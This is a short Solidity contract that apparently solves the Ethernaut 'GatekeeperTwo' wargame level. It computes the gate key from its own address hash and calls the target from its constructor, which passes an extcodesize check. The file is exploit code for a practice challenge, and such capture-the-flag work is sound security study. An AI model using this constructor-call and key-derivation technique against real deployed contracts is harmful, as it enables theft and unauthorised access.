// SPDX-license-Identifier: MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel14.sol";

contract AttackGatekeeperTwo {
    constructor(GatekeeperTwo _addr) {
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        _addr.enter(_gateKey);
    }
}
